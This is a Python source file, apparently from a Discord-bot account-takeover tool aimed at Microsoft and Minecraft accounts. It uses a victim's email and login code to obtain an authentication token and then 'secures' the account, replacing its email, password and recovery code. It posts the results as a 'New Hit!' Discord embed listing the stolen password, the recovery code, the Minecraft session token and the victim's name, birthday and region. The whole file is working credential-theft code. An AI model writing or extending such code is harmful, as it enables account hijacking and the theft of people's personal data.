from views.utils.getMSAAUTH import getMSAAUTH

from views.utils.securing.getLiveData import getLiveData
# from views.utils.securing.getWLSSC import getWLSSC
from views.utils.securing.secure import secure

from discord import Embed

import json
import time

async def startSecuringAccount(email: str, device: str = None, code: str = None):
    
    data = getLiveData() # {urlPost, ppft, cookies, headers}

    print(f"PPFT: {data["ppft"]}")

    # str or None | dict
    # urlPost, ppft
    msaauth = getMSAAUTH(email, device, data, code)

    # WLSSC = getWLSSC(msaauth, urlPost, ppft)
    
    if not msaauth:
        print("[-] - Failed to get MSAAUTH")
        return None
    
    print("[+] - Got MSAAUTH | Starting to secure...")
    initialTime = time.time()
    account = secure(msaauth)
    print(account)

    finalTime = (time.time() - initialTime)

    infoEmbed = Embed()

    infoEmbed.add_field(name="First Name", value=f"```{account['firstName']}```", inline=False)
    infoEmbed.add_field(name="Last Name", value=f"```{account['lastName']}```", inline=True)
    infoEmbed.add_field(name="Full Name", value=f"```{account['fullName']}```", inline=False)
    infoEmbed.add_field(name="Region", value=f"```{account['region']}```", inline=False)
    infoEmbed.add_field(name="Birthday", value=f"```{account['birthday']}```", inline=False)

    hitEmbed = Embed(
        title = f"New Hit!",
        color = 0xE4D00A
    )

    # Once primaryEmail is done oldEmail -> Email
    hitEmbed.add_field(name="👤 Username", value=f"```{account['oldName']}```", inline=False)
    hitEmbed.add_field(name="🛠 Method", value=f"```{account['method']}```", inline=True)
    hitEmbed.add_field(name="🎽 Capes", value=f"```{account['capes']}```", inline=True)
    hitEmbed.add_field(name="📧 Old Email", value=f"```{account['oldEmail']}```", inline=False)
    hitEmbed.add_field(name="📧 Email", value=f"```{account['email']}```", inline=False)
    hitEmbed.add_field(name="📩 Security Email", value=f"```{account['secEmail']}```", inline=True)
    hitEmbed.add_field(name="🔒 Password", value=f"```{account['password']}```", inline=False)
    hitEmbed.add_field(name="🧯 Recovery Code", value=f"```{account['recoveryCode']}```", inline=False)
    hitEmbed.set_footer(text = f"Took {round(finalTime, 2)} seconds securing!")
    
    mcEmbed = Embed()

    if account["method"] == "Purchased":

        mcEmbed.add_field(name="**Current Username**", value=f"```{account['oldName']}```", inline=False)
        mcEmbed.add_field(name="**Is Username Changeable**", value=f"```{account['usernameInfo']}```", inline=False)       
        mcEmbed.add_field(name="**SSID**", value=f"```{account['SSID']}```", inline=False)
        mcEmbed.color = 0x50C878

        hitEmbed.set_thumbnail(url = f"https://mineskin.eu/avatar/{account["oldName"]}")
        hitEmbed.color = 0x50C878
    
    else:

        mcEmbed.description = "**This account does not own Minecraft**"
        mcEmbed.color = 0xFF5C5C

    return [
        hitEmbed,
        infoEmbed,
        mcEmbed
    ]